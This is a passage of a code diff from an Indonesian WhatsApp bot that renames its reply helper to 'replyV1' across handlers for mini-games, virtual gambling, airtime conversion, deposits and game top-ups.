+        await replyV1(`❌ Gagal membuka Murder Mystery: ${error?.message || error}`)
     }
     break
 }
@@ -9577,7 +9550,7 @@ case 'aimshooter':
 case 'shooting':
 case 'richaim': {
     try { await sendRichHtmlGame(conn, m.chat, 'aim-shooter') }
-    catch (error) { console.error('[RICHHTML aim-shooter]', error?.stack || error); await Reply(`❌ Gagal membuka Aim Shooter: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML aim-shooter]', error?.stack || error); await replyV1(`❌ Gagal membuka Aim Shooter: ${error?.message || error}`) }
     break
 }
 
@@ -9585,7 +9558,7 @@ case 'platformer':
 case 'jump':
 case 'richplatformer': {
     try { await sendRichHtmlGame(conn, m.chat, 'platformer') }
-    catch (error) { console.error('[RICHHTML platformer]', error?.stack || error); await Reply(`❌ Gagal membuka Platformer: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML platformer]', error?.stack || error); await replyV1(`❌ Gagal membuka Platformer: ${error?.message || error}`) }
     break
 }
 
@@ -9593,7 +9566,7 @@ case 'ular':
 case 'snake':
 case 'richsnake': {
     try { await sendRichHtmlGame(conn, m.chat, 'snake') }
-    catch (error) { console.error('[RICHHTML snake]', error?.stack || error); await Reply(`❌ Gagal membuka Snake Neon Ultra: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML snake]', error?.stack || error); await replyV1(`❌ Gagal membuka Snake Neon Ultra: ${error?.message || error}`) }
     break
 }
 
@@ -9601,7 +9574,7 @@ case 'flappy':
 case 'flappybird':
 case 'richflappy': {
     try { await sendRichHtmlGame(conn, m.chat, 'flappy') }
-    catch (error) { console.error('[RICHHTML flappy]', error?.stack || error); await Reply(`❌ Gagal membuka Flappy Bird: ${error?.message || error}`) }
+    catch (error) { console.error('[RICHHTML flappy]', error?.stack || error); await replyV1(`❌ Gagal membuka Flappy Bird: ${error?.message || error}`) }
     break
 }
 
@@ -9612,7 +9585,7 @@ case 'richplane': {
         await sendRichHtmlGame(conn, m.chat, 'plane')
     } catch (error) {
         console.error('[RICHHTML plane]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Space Rush: ${error?.message || error}`)
+        await replyV1(`❌ Gagal membuka Space Rush: ${error?.message || error}`)
     }
     break
 }
@@ -9624,7 +9597,7 @@ case 'richdino': {
         await sendRichHtmlGame(conn, m.chat, 'dino')
     } catch (error) {
         console.error('[RICHHTML dino]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Dino Runner: ${error?.message || error}`)
+        await replyV1(`❌ Gagal membuka Dino Runner: ${error?.message || error}`)
     }
     break
 }
@@ -9637,7 +9610,7 @@ case 'richchess': {
         await sendRichHtmlGame(conn, m.chat, 'chess')
     } catch (error) {
         console.error('[RICHHTML chess]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Mini Chess: ${error?.message || error}`)
+        await replyV1(`❌ Gagal membuka Mini Chess: ${error?.message || error}`)
     }
     break
 }
@@ -9650,7 +9623,7 @@ case 'richmbim': {
         await sendRichHtmlGame(conn, m.chat, 'mbim')
     } catch (error) {
         console.error('[RICHHTML mbim]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Highway Rush: ${error?.message || error}`)
+        await replyV1(`❌ Gagal membuka Highway Rush: ${error?.message || error}`)
     }
     break
 }
@@ -9663,7 +9636,7 @@ case 'richttt': {
         await sendRichHtmlGame(conn, m.chat, 'tictactoe')
     } catch (error) {
         console.error('[RICHHTML ttt]', error?.stack || error)
-        await Reply(`❌ Gagal membuka Tic-Tac-Toe: ${error?.message || error}`)
+        await replyV1(`❌ Gagal membuka Tic-Tac-Toe: ${error?.message || error}`)
     }
     break
 }
@@ -9677,7 +9650,7 @@ case 'caklontong': {
         })
     } catch (error) {
         console.error('[CAKLONTONG START]', error?.stack || error)
-        await Reply(`❌ Gagal memulai Cak Lontong.\n${String(error?.message || error).slice(0, 280)}`)
+        await replyV1(`❌ Gagal memulai Cak Lontong.\n${String(error?.message || error).slice(0, 280)}`)
     }
     break
 }
@@ -9737,7 +9710,7 @@ case 'gamehelp': {
 }
 case 'judi': {
     if (!args[0]) {
-        return Reply(
+        return replyV1(
             `🎰 *JUDI VIRTUAL*\n\n` +
             `Cara:\n` +
             `${prefix}judi <jumlah>\n\n` +
@@ -9758,7 +9731,7 @@ case 'judi': {
         )
 
     if (!bet) {
-        return Reply(
+        return replyV1(
             `❌ Jumlah taruhan tidak valid.\n\n` +
             `Saldo kamu: Rp${judi.formatMoney(balance)}\n\n` +
             `Contoh:\n` +
@@ -9775,14 +9748,14 @@ case 'judi': {
         )
 
     if (!result.ok) {
-        return Reply(
+        return replyV1(
             `❌ Saldo tidak mencukupi.\n\n` +
             `Saldo: Rp${judi.formatMoney(result.balance)}`
         )
     }
 
     if (result.win) {
-        return Reply(
+        return replyV1(
             `🎰 *JUDI*\n\n` +
             `🎉 *MENANG!*\n\n` +
             `Taruhan : Rp${judi.formatMoney(bet)}\n` +
@@ -9791,7 +9764,7 @@ case 'judi': {
         )
     }
 
-    return Reply(
+    return replyV1(
         `🎰 *JUDI*\n\n` +
         `💀 *KALAH!*\n\n` +
         `Taruhan : Rp${judi.formatMoney(bet)}\n` +
@@ -9803,7 +9776,7 @@ break
 
 case 'judipvp': {
     if (!m.isGroup) {
-        return Reply(
+        return replyV1(
             '❌ Fitur Judi PvP hanya bisa digunakan di grup.'
         )
     }
@@ -9812,7 +9785,7 @@ case 'judipvp': {
         m.mentionedJid?.[0]
 
     if (!target) {
-        return Reply(
+        return replyV1(
             `🎰 *JUDI PVP*\n\n` +
             `Tag lawan yang ingin ditantang.\n\n` +
             `Contoh:\n` +
@@ -9821,7 +9794,7 @@ case 'judipvp': {
     }
 
     if (target === m.sender) {
-        return Reply(
+        return replyV1(
             '❌ Kamu tidak bisa menantang diri sendiri.'
         )
     }
@@ -9833,7 +9806,7 @@ case 'judipvp': {
         )
 
     if (!betArg) {
-        return Reply(
+        return replyV1(
             `❌ Masukkan jumlah taruhan.\n\n` +
             `Contoh:\n` +
             `${prefix}judipvp @user 10k`
@@ -9850,7 +9823,7 @@ case 'judipvp': {
         )
 
     if (!bet) {
-        return Reply(
+        return replyV1(
             `❌ Taruhan tidak valid atau saldo tidak cukup.\n\n` +
             `Saldo kamu: Rp${judi.formatMoney(balance)}`
         )
@@ -9866,19 +9839,19 @@ case 'judipvp': {
 
     if (!result.ok) {
         if (result.error === 'BUSY') {
-            return Reply(
+            return replyV1(
                 '❌ Salah satu pemain sedang mempunyai tantangan Judi PvP.'
             )
         }
 
         if (result.error === 'BALANCE') {
-            return Reply(
+            return replyV1(
                 `❌ Saldo tidak cukup.\n\n` +
                 `Saldo: Rp${judi.formatMoney(result.balance)}`
             )
         }
 
-        return Reply(
+        return replyV1(
             '❌ Gagal membuat tantangan Judi PvP.'
         )
     }
@@ -9910,7 +9883,7 @@ case 'judipvp': {
 break
 case 'tolakjudi': {
     if (!m.isGroup) {
-        return Reply(
+        return replyV1(
             '❌ Judi PvP hanya bisa digunakan di grup.'
         )
     }
@@ -9922,12 +9895,12 @@ case 'tolakjudi': {
         )
 
     if (!result.ok) {
-        return Reply(
+        return replyV1(
             '❌ Tidak ada tantangan Judi PvP yang bisa ditolak.'
         )
     }
 
-    return Reply(
+    return replyV1(
         '✅ Tantangan Judi PvP telah dibatalkan.'
     )
 }
@@ -9941,7 +9914,7 @@ case 'judistats': {
             ? `+Rp${judi.formatMoney(stats.profit)}`
             : `-Rp${judi.formatMoney(Math.abs(stats.profit))}`
 
-    return Reply(
+    return replyV1(
         `🎰 *JUDI STATS*\n\n` +
         `🎮 Main   : ${stats.played}\n` +
         `🏆 Menang : ${stats.wins}\n` +
@@ -9952,9 +9925,9 @@ case 'judistats': {
 }
 break
 case 'inactive': {
-    if (!m.isGroup) return Reply(mess.group)
+    if (!m.isGroup) return replyV1(mess.group)
     if (!groupMetadata) {
-        return Reply('❌ Gagal mengambil data grup.')
+        return replyV1('❌ Gagal mengambil data grup.')
     }
 
     const groupDb = global.db.groups[m.chat]
@@ -9969,7 +9942,7 @@ case 'inactive': {
     const members = groupMetadata.participants.filter(p => !p.admin)
 
     if (!members.length) {
-        return Reply('❌ Tidak ada member biasa.')
+        return replyV1('❌ Tidak ada member biasa.')
     }
 
     const data = members.map(p => {
@@ -10034,13 +10007,13 @@ break;
 // =========================
 case 'tgbind': {
     const code = String(args[0] || '').trim()
-    if (!code) return Reply(`Contoh: ${prefix}tgbind ABC123`)
+    if (!code) return replyV1(`Contoh: ${prefix}tgbind ABC123`)
     try {
         const result = telegramService.verifyBindCode(code, m.sender)
-        if (!result.ok) return Reply(`❌ ${result.error}`)
-        return Reply(`✅ *TELEGRAM BERHASIL TERHUBUNG*\n\nAkun WhatsApp ini sekarang terhubung ke Telegram.\nBuka bot Telegram Xeryuu lalu gunakan /saldo atau /profile.`)
+        if (!result.ok) return replyV1(`❌ ${result.error}`)
+        return replyV1(`✅ *TELEGRAM BERHASIL TERHUBUNG*\n\nAkun WhatsApp ini sekarang terhubung ke Telegram.\nBuka bot Telegram Xeryuu lalu gunakan /saldo atau /profile.`)
     } catch (e) {
-        return Reply(`❌ Gagal menghubungkan Telegram: ${e?.message || e}`)
+        return replyV1(`❌ Gagal menghubungkan Telegram: ${e?.message || e}`)
     }
 }
 break
@@ -10052,18 +10025,18 @@ case 'ratepulsa': {
 }
 break
 case 'cppage': {
-    if (m.isGroup) return Reply('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
     return showConvertPulsaOperators(Number(args[0] || 0))
 }
 break
 case 'cpoperator': {
-    if (m.isGroup) return Reply('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
     const session = convertPulsaSessionForCurrentUser()
-    if (!session || !Array.isArray(session.operators)) return Reply(`Sesi menu tidak ditemukan. Mulai ulang dengan ${prefix}convertpulsa.`)
+    if (!session || !Array.isArray(session.operators)) return replyV1(`Sesi menu tidak ditemukan. Mulai ulang dengan ${prefix}convertpulsa.`)
     const index = Number(args[0])
-    if (!Number.isSafeInteger(index) || index < 0 || index >= session.operators.length) return Reply(`Pilihan operator tidak valid. Buka ulang ${prefix}convertpulsa.`)
+    if (!Number.isSafeInteger(index) || index < 0 || index >= session.operators.length) return replyV1(`Pilihan operator tidak valid. Buka ulang ${prefix}convertpulsa.`)
     const operator = session.operators[index]
-    if (!operator || !operator.available) return Reply('❌ Operator sedang offline atau maintenance menurut API PesanJasa. Pilih operator yang tersedia.')
+    if (!operator || !operator.available) return replyV1('❌ Operator sedang offline atau maintenance menurut API PesanJasa. Pilih operator yang tersedia.')
     saveConvertPulsaSession({ step: 'amount', operatorId: String(operator.id), operatorName: operator.name, minAmount: operator.minAmount, maxAmount: operator.maxAmount, selectedOperatorAt: Date.now() })
     const suggestions = [30000, 50000, 100000, 200000, 500000]
         .filter(amount => (operator.minAmount == null || amount >= operator.minAmount) && (operator.maxAmount == null || amount <= operator.maxAmount))
@@ -10084,25 +10057,25 @@ case 'cpoperator': {
 }
 break
 case 'cpamount': {
-    if (m.isGroup) return Reply('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
-    if (!args[0]) return Reply(`Masukkan nominal: ${prefix}cpamount 50000`)
+    if (m.isGroup) return replyV1('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
+    if (!args[0]) return replyV1(`Masukkan nominal: ${prefix}cpamount 50000`)
     return convertPulsaSetAmount(args[0])
 }
 break
 case 'cppayoutpage': {
-    if (m.isGroup) return Reply('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
     const session = convertPulsaSessionForCurrentUser()
-    if (!session || session.step !== 'payout') return Reply(`Pilih nominal dan operator dahulu melalui ${prefix}convertpulsa.`)
+    if (!session || session.step !== 'payout') return replyV1(`Pilih nominal dan operator dahulu melalui ${prefix}convertpulsa.`)
     return showConvertPulsaPayoutMethods(session, Number(args[0] || 0))
 }
 break
 case 'cppayout': {
-    if (m.isGroup) return Reply('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Kelola convert pulsa hanya melalui chat pribadi bot.')
     const session = convertPulsaSessionForCurrentUser()
-    if (!session || session.step !== 'payout') return Reply(`Sesi pilihan pencairan tidak ditemukan. Mulai ulang dengan ${prefix}convertpulsa.`)
+    if (!session || session.step !== 'payout') return replyV1(`Sesi pilihan pencairan tidak ditemukan. Mulai ulang dengan ${prefix}convertpulsa.`)
     const index = Number(args[0])
     const methods = safeConvertPayoutMethods(session.payoutMethods)
-    if (!Number.isSafeInteger(index) || index < 0 || index >= methods.length) return Reply('❌ Pilihan e-wallet tidak valid. Buka ulang pilihan metode pencairan.')
+    if (!Number.isSafeInteger(index) || index < 0 || index >= methods.length) return replyV1('❌ Pilihan e-wallet tidak valid. Buka ulang pilihan metode pencairan.')
     const method = methods[index]
     saveConvertPulsaSession({ step: 'payout_number', payoutMethod: String(method.value), payoutMethodLabel: String(method.label || method.value), payoutOptionIndex: index })
     return sendConvertPulsaWaQuickReplyMenu({
@@ -10118,9 +10091,9 @@ case 'cppayout': {
 }
 break
 case 'cpcreate': {
-    if (m.isGroup) return Reply('🔒 Buat transaksi convert pulsa hanya melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Buat transaksi convert pulsa hanya melalui chat pribadi bot.')
     const session = convertPulsaSessionForCurrentUser()
-    if (!session || session.step !== 'confirm') return Reply('❌ Tidak ada konfirmasi transaksi yang aktif. Mulai ulang dari menu convert pulsa.')
+    if (!session || session.step !== 'confirm') return replyV1('❌ Tidak ada konfirmasi transaksi yang aktif. Mulai ulang dari menu convert pulsa.')
     try {
         const transaction = await convertPulsaService.createOrder({ channel: 'whatsapp', userId: m.sender, pushname })
         return sendConvertPulsaTransaction(transaction)
@@ -10150,17 +10123,17 @@ case 'cpcreate': {
                 })
             }
         }
-        return Reply(`❌ Pesanan convert pulsa belum dibuat: ${error?.message || error}\nJangan mengirim pulsa apa pun sebelum bot memberikan nomor tujuan resmi dari PesanJasa.`)
+        return replyV1(`❌ Pesanan convert pulsa belum dibuat: ${error?.message || error}\nJangan mengirim pulsa apa pun sebelum bot memberikan nomor tujuan resmi dari PesanJasa.`)
     }
 }
 break
 case 'cpstatus':
 case 'cprefresh': {
-    if (m.isGroup) return Reply('🔒 Cek convert pulsa hanya melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Cek convert pulsa hanya melalui chat pribadi bot.')
     const ref = String(args[0] || '').trim().toUpperCase()
-    if (!ref) return Reply(`Contoh: ${prefix}cpstatus CPX...`)
+    if (!ref) return replyV1(`Contoh: ${prefix}cpstatus CPX...`)
     let transaction = convertPulsaService.findOrder(ref)
-    if (!transaction || transaction.channel !== 'whatsapp' || transaction.userId !== m.sender) return Reply('❌ Referensi tidak ditemukan atau bukan milik akun kamu.')
+    if (!transaction || transaction.channel !== 'whatsapp' || transaction.userId !== m.sender) return replyV1('❌ Referensi tidak ditemukan atau bukan milik akun kamu.')
     try {
         if (transaction.providerTrxId && !['SUCCESS', 'FAILED', 'EXPIRED', 'CREATE_FAILED', 'REVIEW_REQUIRED'].includes(String(transaction.status || '').toUpperCase())) {
             transaction = await convertPulsaService.refresh(ref, { channel: 'whatsapp', userId: m.sender })
@@ -10179,7 +10152,7 @@ case 'cprefresh': {
 break
 case 'cpwayat':
 case 'convertriwayat': {
-    if (m.isGroup) return Reply('🔒 Riwayat convert pulsa hanya dapat dibuka melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Riwayat convert pulsa hanya dapat dibuka melalui chat pribadi bot.')
     const transactions = convertPulsaService.listByUser('whatsapp', m.sender, 8)
     if (!transactions.length) return sendConvertPulsaWaQuickReplyMenu({
         text: '📚 BELUM ADA RIWAYAT CONVERT PULSA\n\nMulai dari menu convert pulsa untuk melihat kurs dan membuat draft transaksi.',
@@ -10196,31 +10169,31 @@ case 'convertriwayat': {
 break
 case 'cpbukti':
 case 'cpproof': {
-    if (m.isGroup) return Reply('🔒 Bukti transaksi convert pulsa hanya dapat dikirim melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Bukti transaksi convert pulsa hanya dapat dikirim melalui chat pribadi bot.')
     return startConvertPulsaProof(args[0])
 }
 break
 case 'cpcancelproof': {
-    if (m.isGroup) return Reply('🔒 Sesi bukti convert pulsa hanya dapat dikelola melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Sesi bukti convert pulsa hanya dapat dikelola melalui chat pribadi bot.')
     const session = convertPulsaSessionForCurrentUser()
-    if (!session || session.step !== 'proof_upload') return Reply('Tidak ada sesi pengiriman bukti yang aktif. Transaksi PesanJasa tidak diubah.')
+    if (!session || session.step !== 'proof_upload') return replyV1('Tidak ada sesi pengiriman bukti yang aktif. Transaksi PesanJasa tidak diubah.')
     const returnStep = String(session.proofReturnStep || '')
     if (returnStep) saveConvertPulsaSession({ step: returnStep, proofRef: '', proofReturnStep: '' })
     else convertPulsaService.clearSession('whatsapp', m.sender)
-    return Reply('✅ Pengiriman bukti dibatalkan. Tidak ada file yang diteruskan dan status transaksi PesanJasa tidak diubah.')
+    return replyV1('✅ Pengiriman bukti dibatalkan. Tidak ada file yang diteruskan dan status transaksi PesanJasa tidak diubah.')
 }
 break
 case 'cpcancel':
 case 'cpbatal': {
-    if (m.isGroup) return Reply('🔒 Draft convert pulsa hanya dapat dibatalkan melalui chat pribadi bot.')
+    if (m.isGroup) return replyV1('🔒 Draft convert pulsa hanya dapat dibatalkan melalui chat pribadi bot.')
     const session = convertPulsaSessionForCurrentUser()
-    if (!session) return Reply('Tidak ada draft convert pulsa yang aktif.')
+    if (!session) return replyV1('Tidak ada draft convert pulsa yang aktif.')
     if (session.requestedAt || session.localRef) {
         const transaction = session.localRef ? convertPulsaService.findOrder(session.localRef) : null
-        return Reply(`⚠️ Permintaan order sudah pernah dimulai dan tidak bisa dibatalkan otomatis di bot. ${transaction ? `Referensi: ${transaction.ref}. Status: ${convertPulsaStatusLabel(transaction.status)}.` : ''}\nJangan kirim pulsa sebelum ada instruksi provider. Cek referensi atau hubungi owner untuk rekonsiliasi.`)
+        return replyV1(`⚠️ Permintaan order sudah pernah dimulai dan tidak bisa dibatalkan otomatis di bot. ${transaction ? `Referensi: ${transaction.ref}. Status: ${convertPulsaStatusLabel(transaction.status)}.` : ''}\nJangan kirim pulsa sebelum ada instruksi provider. Cek referensi atau hubungi owner untuk rekonsiliasi.`)
     }
     convertPulsaService.clearSession('whatsapp', m.sender)
-    return Reply('✅ Draft convert pulsa dibatalkan. Tidak ada pesanan provider yang dibuat dan tidak ada saldo/pulsa yang diproses.')
+    return replyV1('✅ Draft convert pulsa dibatalkan. Tidak ada pesanan provider yang dibuat dan tidak ada saldo/pulsa yang diproses.')
 }
 break
 
@@ -10228,7 +10201,7 @@ case 'deposit':
 case 'depo': {
     const amount = args[0]
     if (!amount) {
-        return Reply(
+        return replyV1(
             `╭─〔 💳 DEPOSIT SALDO 〕
 ` +
             `║ 💰 Minimal : *Rp${depositService.formatMoney(global.depositConfig?.minAmount || 1000)}*
@@ -10273,7 +10246,7 @@ case 'depo': {
 
         return sendDepositInteractive(tx, image, caption)
     } catch (e) {
-        return Reply(`❌ Deposit gagal: ${e?.message || e}`)
+        return replyV1(`❌ Deposit gagal: ${e?.message || e}`)
     }
 }
 break
@@ -10281,18 +10254,18 @@ case 'depositcancel':
 case 'canceldeposit':
 case 'bataldeposit': {
     const ref = String(args[0] || '').trim()
-    if (!ref) return Reply(`Contoh: ${prefix}depositcancel DEPXXXX`)
+    if (!ref) return replyV1(`Contoh: ${prefix}depositcancel DEPXXXX`)
     try {
         const txBefore = depositService.get(ref)
-        if (!txBefore) return Reply('❌ Invoice pembayaran tidak ditemukan.')
-        if (txBefore.jid !== m.sender && !isOwner) return Reply('❌ Invoice ini bukan milik kamu.')
+        if (!txBefore) return replyV1('❌ Invoice pembayaran tidak ditemukan.')
+        if (txBefore.jid !== m.sender && !isOwner) return replyV1('❌ Invoice ini bukan milik kamu.')
         if (String(txBefore.kind || 'DEPOSIT').toUpperCase() !== 'DEPOSIT') {
-            return Reply('❌ Perintah ini hanya untuk invoice deposit saldo. Untuk order Store/Jadibot/Sewa Bot, gunakan status order agar alur stok dan pembayaran tetap sinkron.')
+            return replyV1('❌ Perintah ini hanya untuk invoice deposit saldo. Untuk order Store/Jadibot/Sewa Bot, gunakan status order agar alur stok dan pembayaran tetap sinkron.')
         }
 
         const tx = await depositService.cancel(ref, m.sender)
         const cleanup = await deleteStoredQrMessages(tx, ref)
-        return Reply(
+        return replyV1(
             `╭─〔 ❌ TRANSAKSI DIBATALKAN 〕\n` +
             `║ 🧾 Invoice : *${tx.merchantRef}*\n` +
             `║ 💰 Nominal : *Rp${depositService.formatMoney(tx.amount)}*\n` +
@@ -10302,22 +10275,22 @@ case 'bataldeposit': {
 Pembatalan ini bersifat lokal. Jika QR lama sempat disimpan dan tetap dibayar, sistem akan mengamankan nominal terkonfirmasi ke Saldo Biasa agar dana tidak hilang.`
         )
     } catch (e) {
-        return Reply(`❌ Gagal membatalkan transaksi: ${e?.message || e}`)
+        return replyV1(`❌ Gagal membatalkan transaksi: ${e?.message || e}`)
     }
 }
 break
 case 'depositstatus':
 case 'cekdeposit': {
-    if (!args[0]) return Reply(`Contoh: ${prefix}depositstatus DEPXXXX`)
+    if (!args[0]) return replyV1(`Contoh: ${prefix}depositstatus DEPXXXX`)
     try {
         const before = depositService.get(args[0])
-        if (!before) return Reply('❌ Invoice deposit tidak ditemukan.')
-        if (before.jid !== m.sender && !isOwner) return Reply('❌ Invoice ini bukan milik akun kamu.')
+        if (!before) return replyV1('❌ Invoice deposit tidak ditemukan.')
+        if (before.jid !== m.sender && !isOwner) return replyV1('❌ Invoice ini bukan milik akun kamu.')
         if (String(before.kind || 'DEPOSIT').toUpperCase() !== 'DEPOSIT') {
-            return Reply('❌ Referensi tersebut bukan invoice deposit saldo. Untuk Store/Jadibot/Sewa Bot gunakan .orderstatus <ref>; untuk invoice pembelian yang didukung gunakan .purchaseqrisstatus <ref>.')
+            return replyV1('❌ Referensi tersebut bukan invoice deposit saldo. Untuk Store/Jadibot/Sewa Bot gunakan .orderstatus <ref>; untuk invoice pembelian yang didukung gunakan .purchaseqrisstatus <ref>.')
         }
         const tx = await depositService.check(args[0])
-        return Reply(
+        return replyV1(
             `╭─〔 💳 STATUS DEPOSIT 〕\n` +
             `║ Invoice : *${tx.merchantRef}*\n` +
             `║ Nominal : *Rp${depositService.formatMoney(tx.amount)}*\n` +
@@ -10326,7 +10299,7 @@ case 'cekdeposit': {
             `╰────────────────`
         )
     } catch (e) {
-        return Reply(`❌ ${e?.message || e}`)
+        return replyV1(`❌ ${e?.message || e}`)
     }
 }
 break
@@ -10365,14 +10338,14 @@ case 'roblox': {
     }
     let customerNo, zone = '', nominal
     if (game === 'ml') {
-        if (values.length < 3) return Reply(`Contoh: ${prefix}ml 12345678 1234 86`)
+        if (values.length < 3) return replyV1(`Contoh: ${prefix}ml 12345678 1234 86`)
         customerNo = String(values[0]).trim(); zone = String(values[1]).trim(); nominal = values[2]
     } else {
-        if (values.length < 2) return Reply(`Contoh: ${prefix}${game} ${game === 'roblox' ? 'Username' : '123456789'} 70`)
+        if (values.length < 2) return replyV1(`Contoh: ${prefix}${game} ${game === 'roblox' ? 'Username' : '123456789'} 70`)
         customerNo = String(values[0]).trim(); nominal = values[1]
     }
-    if (!topupService.ready()) return Reply('❌ API VIPayment belum dikonfigurasi. Periksa kredensial VIPayment pada settings.js lalu restart bot.')
-    if (!customerNo || (game === 'ml' && !zone)) return Reply('❌ ID/zone tujuan tidak valid.')
+    if (!topupService.ready()) return replyV1('❌ API VIPayment belum dikonfigurasi. Periksa kredensial VIPayment pada settings.js lalu restart bot.')
+    if (!customerNo || (game === 'ml' && !zone)) return replyV1('❌ ID/zone tujuan tidak valid.')
     try {
         const products = await topupService.prices(game)
         const target = Number(String(nominal).replace(/[^0-9.]/g, ''))
@@ -10380,9 +10353,9 @@ case 'roblox': {
             const nums = String(p.name || '').match(/\d+(?:[.,]\d+)?/g) || []
             return nums.some(n => Number(n.replace(',', '.')) === target)
         }) || products.find(p => String(p.name).toLowerCase().includes(String(nominal).toLowerCase()))
-        if (!product) return Reply(`❌ Nominal *${nominal}* tidak tersedia untuk ${game.toUpperCase()}. Gunakan ${prefix}cekharga ${game}.`)
+        if (!product) return replyV1(`❌ Nominal *${nominal}* tidak tersedia untuk ${game.toUpperCase()}. Gunakan ${prefix}cekharga ${game}.`)
         const sellingPrice = Math.floor(Number(product.sellingPrice || 0))
-        if (!Number.isSafeInteger(sellingPrice) || sellingPrice <= 0 || !product.code) return Reply('❌ Harga atau kode produk VIPayment tidak valid. Pesanan tidak dibuat.')
+        if (!Number.isSafeInteger(sellingPrice) || sellingPrice <= 0 || !product.code) return replyV1('❌ Harga atau kode produk VIPayment tidak valid. Pesanan tidak dibuat.')
         const nameNums = String(product.name || '').match(/\d+(?:[.,]\d+)?/g) || []
         const serviceNominal = nameNums[0] ? nameNums[0].replace(',', '.') : String(nominal)
         const intent = purchasePayment.createIntent({
@@ -10392,7 +10365,7 @@ case 'roblox': {
         })
         return await sendPurchaseMethodMenu(intent)
     } catch (error) {
-        return Reply(`❌ Gagal menyiapkan top up: ${error?.message || error}\nPesanan provider belum dibuat.`)
+        return replyV1(`❌ Gagal menyiapkan top up: ${error?.message || error}\nPesanan provider belum dibuat.`)
     }
 }
 break
@@ -10402,24 +10375,24 @@ case 'topupbuy': {
     const customerNo = String(args[2] || '').trim()
     const zone = String(args[3] || '').trim()
 
-    if (!['ff', 'ml', 'roblox'].includes(game)) return Reply(`Format: ${prefix}topupbuy <ff|ml|roblox> <kode_produk> <ID/username> [server]`)
-    if (!code) return Reply(`Pilih produk dahulu melalui ${prefix}cekharga ${game}.`)
+    if (!['ff', 'ml', 'roblox'].includes(game)) return replyV1(`Format: ${prefix}topupbuy <ff|ml|roblox> <kode_produk> <ID/username> [server]`)
+    if (!code) return replyV1(`Pilih produk dahulu melalui ${prefix}cekharga ${game}.`)
     if (game === 'ml' && (!customerNo || !zone)) {
-        return Reply(`✅ Produk Mobile Legends dipilih.\n\nFormat order:\n${prefix}topupbuy ml ${code} <ID> <SERVER>\n\nContoh: ${prefix}topupbuy ml ${code} 12345678 1234`)
+        return replyV1(`✅ Produk Mobile Legends dipilih.\n\nFormat order:\n${prefix}topupbuy ml ${code} <ID> <SERVER>\n\nContoh: ${prefix}topupbuy ml ${code} 12345678 1234`)
     }
     if (!customerNo) {
         const targetLabel = game === 'roblox' ? 'username Roblox' : 'ID game'
-        return Reply(`✅ Produk ${code} dipilih.\n\nLanjutkan dengan format:\n${prefix}topupbuy ${game} ${code} <${targetLabel}>`)
+        return replyV1(`✅ Produk ${code} dipilih.\n\nLanjutkan dengan format:\n${prefix}topupbuy ${game} ${code} <${targetLabel}>`)
     }
-    if (!topupService.ready()) return Reply('❌ API VIPayment belum dikonfigurasi. Periksa kredensial di settings.js.')
+    if (!topupService.ready()) return replyV1('❌ API VIPayment belum dikonfigurasi. Periksa kredensial di settings.js.')
 
     try {
         const products = await topupService.prices(game)
         const product = products.find(item => String(item.code).toLowerCase() === code.toLowerCase())
-        if (!product) return Reply(`❌ Kode produk ${code} tidak ditemukan pada katalog ${game.toUpperCase()}. Buka ulang ${prefix}cekharga ${game}.`)
+        if (!product) return replyV1(`❌ Kode produk ${code} tidak ditemukan pada katalog ${game.toUpperCase()}. Buka ulang ${prefix}cekharga ${game}.`)
         const sellingPrice = Math.floor(Number(product.sellingPrice || 0))
         if (!Number.isSafeInteger(sellingPrice) || sellingPrice <= 0 || !product.code) {
-            return Reply('❌ Harga atau kode produk tidak valid. Pesanan tidak dibuat.')
+            return replyV1('❌ Harga atau kode produk tidak valid. Pesanan tidak dibuat.')
         }
         const nameNums = String(product.name || '').match(/\d+(?:[.,]\d+)?/g) || []
         const serviceNominal = nameNums[0] ? nameNums[0].replace(',', '.') : String(product.name || code)
@@ -10441,14 +10414,14 @@ case 'topupbuy': {
         })
         return await sendPurchaseMethodMenu(intent)
     } catch (error) {
-        return Reply(`❌ Gagal menyiapkan top up: ${error?.message || error}\nPesanan provider belum dibuat.`)
+        return replyV1(`❌ Gagal menyiapkan top up: ${error?.message || error}\nPesanan provider belum dibuat.`)
     }
 }
 break
 case 'topuppay': {
     const mode = String(args[0] || '').toLowerCase()
     const token = String(args[1] || '').toUpperCase()
-    if (!token || !['balance', 'qris'].includes(mode)) return Reply(`Format: ${prefix}topuppay <balance|qris> <token>`)
+    if (!token || !['balance', 'qris'].includes(mode)) return replyV1(`Format: ${prefix}topuppay <balance|qris> <token>`)
     if (mode === 'balance') return handleWaPurchaseBalance(token, 'TOPUP')
     return sendPurchaseQr(token, 'TOP UP')
 }
@@ -10457,11 +10430,11 @@ case 'purchaseqriscancel':
 case 'cancelpurchaseqris':
 case 'batalpurchaseqris': {
     const token = String(args[0] || '').trim().toUpperCase()
-    if (!token) return Reply(`Contoh: ${prefix}purchaseqriscancel TOKEN_ORDER`)
+    if (!token) return replyV1(`Contoh: ${prefix}purchaseqriscancel TOKEN_ORDER`)
     try {
         const result = await purchasePayment.cancelQrPayment(token, m.sender)
         const cleanup = await deleteStoredQrMessages(result.payment, result.payment?.merchantRef || '')
-        return Reply(
+        return replyV1(
             `╭─〔 ❌ PEMBELIAN QRIS DIBATALKAN 〕\n` +
             `│ Token: ${result.intent.token}\n` +
